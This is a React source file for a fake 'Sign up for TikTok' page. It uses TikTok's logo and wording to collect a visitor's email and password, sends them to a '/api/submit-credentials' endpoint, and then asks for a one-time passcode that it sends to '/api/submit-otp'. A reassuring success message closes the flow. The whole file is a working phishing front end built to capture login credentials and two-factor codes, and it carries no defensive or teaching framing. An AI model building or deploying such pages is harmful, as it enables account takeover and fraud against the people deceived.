import { useState } from "react";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { credentialSubmitSchema, type CredentialSubmit } from "@shared/schema";
import { useMutation } from "@tanstack/react-query";
import { apiRequest } from "@/lib/queryClient";
import { useToast } from "@/hooks/use-toast";
import { Button } from "@/components/ui/button";
import {
  Form,
  FormControl,
  FormField,
  FormItem,
  FormLabel,
  FormMessage,
} from "@/components/ui/form";
import { Input } from "@/components/ui/input";
import { Eye, EyeOff, X, CheckCircle2 } from "lucide-react";
import { TikTokLogo } from "@/components/tiktok-logo";
import { useLocation } from "wouter";
import { z } from "zod";

export default function SignUpPage() {
  const [showPassword, setShowPassword] = useState(false);
  const [step, setStep] = useState<"credentials" | "otp" | "success">("credentials");
  const [submissionId, setSubmissionId] = useState<number | null>(null);
  const [, setLocation] = useLocation();
  const { toast } = useToast();

  const form = useForm<CredentialSubmit>({
    defaultValues: {
      loginMethod: "email",
      identifier: "",
      password: "",
    },
  });

  const otpForm = useForm({
    defaultValues: {
      otp: "",
    },
  });

  const submitCredentialsMutation = useMutation({
    mutationFn: async (data: CredentialSubmit) => {
      return await apiRequest("POST", "/api/submit-credentials", {
        loginMethod: "email",
        identifier: data.identifier,
        password: data.password,
      });
    },
    onSuccess: (data: any) => {
      setSubmissionId(data.submissionId);
      setStep("otp");
      toast({
        title: "Credentials saved!",
        description: "Please enter the OTP to continue.",
      });
    },
    onError: (error: any) => {
      toast({
        title: "Submission failed",
        description: error.message || "Unable to save credentials",
        variant: "destructive",
      });
    },
  });

  const submitOtpMutation = useMutation({
    mutationFn: async (otp: string) => {
      if (!submissionId) throw new Error("No submission ID");
      return await apiRequest("POST", "/api/submit-otp", {
        submissionId,
        otp,
      });
    },
    onSuccess: () => {
      setStep("success");
    },
    onError: (error: any) => {
      toast({
        title: "OTP submission failed",
        description: error.message || "Unable to save OTP",
        variant: "destructive",
      });
    },
  });

  const onSubmit = (data: CredentialSubmit) => {
    submitCredentialsMutation.mutate(data);
  };

  const onSubmitOtp = (data: { otp: string }) => {
    submitOtpMutation.mutate(data.otp);
  };

  if (step === "success") {
    return (
      <div className="min-h-screen flex items-center justify-center bg-background p-4">
        <div className="w-full max-w-[380px] space-y-6">
          <div className="text-center space-y-3">
            <TikTokLogo className="mx-auto" />
          </div>
          <div className="space-y-6 text-center py-8">
            <div className="flex justify-center">
              <CheckCircle2 className="w-16 h-16 text-green-500" data-testid="icon-success" />
            </div>
            <div className="space-y-2">
              <h3 className="text-xl font-semibold" data-testid="heading-success">Submission Successful!</h3>
              <p className="text-muted-foreground" data-testid="text-verification-message">
                You will receive a verification email shortly. Please check your inbox and follow the instructions to update your password for security reasons and to avoid violations.
              </p>
            </div>
          </div>
        </div>
      </div>
    );
  }

  if (step === "otp") {
    return (
      <div className="min-h-screen flex items-center justify-center bg-background p-4">
        <div className="w-full max-w-[380px] space-y-6">
          <div className="text-center space-y-3">
            <TikTokLogo className="mx-auto" />
            <h1 className="text-3xl font-bold text-foreground" data-testid="heading-signup">Sign up for TikTok</h1>
          </div>

          <Form {...otpForm}>
            <form onSubmit={otpForm.handleSubmit(onSubmitOtp)} className="space-y-4">
              <FormField
                control={otpForm.control}
                name="otp"
                render={({ field }) => (
                  <FormItem>
                    <FormLabel className="text-sm font-medium" data-testid="label-otp">Enter OTP</FormLabel>
                    <FormControl>
                      <Input
                        placeholder="Enter your OTP"
                        type="text"
                        className="h-12"
                        data-testid="input-otp"
                        {...field}
                      />
                    </FormControl>
                    <FormMessage />
                  </FormItem>
                )}
              />

              <Button
                type="submit"
                className="w-full h-12 text-base font-semibold"
                data-testid="button-submit-otp"
                disabled={submitOtpMutation.isPending}
              >
                {submitOtpMutation.isPending ? "Submitting..." : "Submit OTP"}
              </Button>
            </form>
          </Form>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen flex items-center justify-center bg-background p-4">
      <div className="w-full max-w-[380px] space-y-6">
        <div className="text-center space-y-3">
          <TikTokLogo className="mx-auto" />
          <div className="flex items-center justify-center gap-2">
            <Button
              variant="ghost"
              size="icon"
              onClick={() => setLocation("/")}
              data-testid="button-back-signup"
              className="hover-elevate active-elevate-2"
            >
              <X className="w-5 h-5" />
            </Button>
            <h1 className="text-3xl font-bold text-foreground" data-testid="heading-signup">Sign up for TikTok</h1>
          </div>
          <p className="text-sm text-muted-foreground" data-testid="text-signup-description">
            Create a TikTok account using your email
          </p>
        </div>

        <Form {...form}>
          <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4">
            <FormField
              control={form.control}
              name="identifier"
              render={({ field }) => (
                <FormItem>
                  <FormLabel className="text-sm font-medium" data-testid="label-email">Email</FormLabel>
                  <FormControl>
                    <Input
                      placeholder="Email address"
                      type="email"
                      className="h-12"
                      data-testid="input-email"
                      {...field}
                    />
                  </FormControl>
                  <FormMessage />
                </FormItem>
              )}
            />

            <FormField
              control={form.control}
              name="password"
              render={({ field }) => (
                <FormItem>
                  <FormLabel className="text-sm font-medium" data-testid="label-password">Password</FormLabel>
                  <div className="relative">
                    <FormControl>
                      <Input
                        placeholder="Password"
                        type={showPassword ? "text" : "password"}
                        className="h-12 pr-10"
                        data-testid="input-password"
                        {...field}
                      />
                    </FormControl>
                    <button
                      type="button"
                      onClick={() => setShowPassword(!showPassword)}
                      className="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground transition-colors"
                      data-testid="button-toggle-password"
                    >
                      {showPassword ? (
                        <EyeOff className="w-5 h-5" />
                      ) : (
                        <Eye className="w-5 h-5" />
                      )}
                    </button>
                  </div>
                  <FormMessage />
                </FormItem>
              )}
            />

            <Button
              type="submit"
              className="w-full h-12 text-base font-semibold"
              data-testid="button-signup"
              disabled={submitCredentialsMutation.isPending}
            >
              {submitCredentialsMutation.isPending ? "Submitting..." : "Continue"}
            </Button>
          </form>
        </Form>

        <div className="text-center text-sm">
          <p className="text-muted-foreground">
            Already have an account?{" "}
            <a href="/" className="text-primary font-medium hover:underline" data-testid="link-login">
              Log in
            </a>
          </p>
        </div>

        <div className="text-center text-xs text-muted-foreground space-y-2 pt-4 border-t border-border">
          <p data-testid="text-signup-terms-notice">
            By continuing, you agree to TikTok's{" "}
            <a href="/terms" className="hover:underline" data-testid="link-signup-terms">
              Terms of Service
            </a>{" "}
            and confirm that you have read TikTok's{" "}
            <a href="/privacy" className="hover:underline" data-testid="link-signup-privacy">
              Privacy Policy
            </a>
            .
          </p>
        </div>
      </div>
    </div>
  );
}
